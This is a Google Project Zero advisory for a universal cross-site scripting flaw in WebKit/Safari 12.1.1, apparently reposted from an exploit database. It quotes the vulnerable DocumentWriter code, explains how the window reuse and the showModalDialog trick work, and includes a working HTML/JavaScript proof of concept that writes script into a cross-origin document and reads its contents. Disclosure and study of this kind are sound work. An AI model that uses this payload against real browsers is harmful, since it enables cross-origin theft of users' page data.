@@ -1,0 +1,150 @@
+VULNERABILITY DETAILS
+```
+void DocumentWriter::replaceDocument(const String& source, Document* ownerDocument)
+{
+[...]
+    begin(m_frame->document()->url(), true, ownerDocument); // ***1***
+
+    // begin() might fire an unload event, which will result in a situation where no new document has been attached,
+    // and the old document has been detached. Therefore, bail out if no document is attached.
+    if (!m_frame->document())
+        return;
+
+    if (!source.isNull()) {
+        if (!m_hasReceivedSomeData) {
+            m_hasReceivedSomeData = true;
+            m_frame->document()->setCompatibilityMode(DocumentCompatibilityMode::NoQuirksMode);
+        }
+
+        // FIXME: This should call DocumentParser::appendBytes instead of append
+        // to support RawDataDocumentParsers.
+        if (DocumentParser* parser = m_frame->document()->parser())
+            parser->append(source.impl()); // ***2***
+    }
+```
+
+```
+bool DocumentWriter::begin(const URL& urlReference, bool dispatch, Document* ownerDocument)
+{
+[...]
+    bool shouldReuseDefaultView = m_frame->loader().stateMachine().isDisplayingInitialEmptyDocument() && m_frame->document()->isSecureTransitionTo(url); // ***3***
+    if (shouldReuseDefaultView)
+        document->takeDOMWindowFrom(*m_frame->document());
+    else
+        document->createDOMWindow();
+
+    // Per <http://www.w3.org/TR/upgrade-insecure-requests/>, we need to retain an ongoing set of upgraded
+    // requests in new navigation contexts. Although this information is present when we construct the
+    // Document object, it is discard in the subsequent 'clear' statements below. So, we must capture it
+    // so we can restore it.
+    HashSet<SecurityOriginData> insecureNavigationRequestsToUpgrade;
+    if (auto* existingDocument = m_frame->document())
+        insecureNavigationRequestsToUpgrade = existingDocument->contentSecurityPolicy()->takeNavigationRequestsToUpgrade();
+    
+    m_frame->loader().clear(document.ptr(), !shouldReuseDefaultView, !shouldReuseDefaultView);
+    clear();
+
+    // m_frame->loader().clear() might fire unload event which could remove the view of the document.
+    // Bail out if document has no view.
+    if (!document->view())
+        return false;
+
+    if (!shouldReuseDefaultView)
+        m_frame->script().updatePlatformScriptObjects();
+
+    m_frame->loader().setOutgoingReferrer(url);
+    m_frame->setDocument(document.copyRef());
+[...]
+    m_frame->loader().didBeginDocument(dispatch); // ***4***
+
+    document->implicitOpen();
+[...]
+```
+
+`DocumentWriter::replaceDocument` is responsible for replacing the currently displayed document with
+a new one using the result of evaluating a javascript: URI as the document's source. The method
+calls `DocumentWriter::begin`[1], which might trigger JavaScript execution, and then sends data to
+the parser of the active document[2]. If an attacker can perform another page load right before
+returning from `begin` , the method will append an attacker-controlled string to a potentially
+cross-origin document.
+
+Under normal conditions, a javascript: URI load always makes `begin` associate the new document with
+a new DOMWindow object. However, it's actually possible to meet the requirements of the
+`shouldReuseDefaultView` check[3]. Firstly, the attacker needs to initialize the <iframe> element's
+source URI to a sane value before it's inserted into the document. This will set the frame state to
+`DisplayingInitialEmptyDocumentPostCommit`. Then she has to call `open` on the frame's document
+right after the insertion to stop the initial load and set the document URL to a value that can pass
+the `isSecureTransitionTo` check.
+
+When the window object is re-used, all event handlers defined for the window remain active. So, for
+example, when `didBeginDocument`[4] calls `setReadyState` on the new document, it will trigger the
+window's "readystatechange" handler. Since `NavigationDisabler` is not active at this point, it's
+possible to perform a synchronous page load using the `showModalDialog` trick.
+
+
+VERSION
+WebKit revision 246194
+Safari version 12.1.1 (14607.2.6.1.1)
+
+
+REPRODUCTION CASE
+The attack won't work if the cross-origin document has no active parser by the time `begin` returns.
+The easiest way to reproduce the bug is to call `document.write` from the victim page when the main
+parsing task is complete. However, it's a rather artificial construct, so I've also attached another
+test case, which works for regular pages, but it has to use a python script that emulates a slow web
+server to run reliably.
+
+```
+<body>
+<h1>Click to start</h1>
+<script>
+function createURL(data, type = 'text/html') {
+    return URL.createObjectURL(new Blob([data], {type: type}));
+}
+
+function waitForLoad() {
+    showModalDialog(createURL(`
+        <script>
+        let it = setInterval(() => {
+            try {
+                opener.frame.contentDocument.x;
+            } catch (e) {
+                clearInterval(it);
+                window.close();
+            }
+        }, 2000);
+        </scrip` + 't>'));
+}
+
+window.onclick = () => {
+    frame = document.createElement('iframe');
+    frame.src = location;
+    document.body.appendChild(frame);
+
+    frame.contentDocument.open();
+    frame.contentDocument.onreadystatechange = () => {
+        frame.contentWindow.addEventListener('readystatechange', () => {
+            a = frame.contentDocument.createElement('a');
+            a.href = victim_url;
+            a.click();
+            waitForLoad();
+        }, {capture: true, once: true});
+    }
+    frame.src = 'javascript:"<script>alert(document.documentElement.outerHTML)</scr' + 'ipt>"';
+}
+
+victim_url = 'data:text/html,<script>setTimeout(() => document.write("secret data"), 1000)</scr' + 'ipt>';
+ext = document.body.appendChild(document.createElement('iframe'));
+ext.src = victim_url;
+</script>
+</body> 
+
+```
+
+
+CREDIT INFORMATION
+Sergei Glazunov of Google Project Zero
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47450.zip
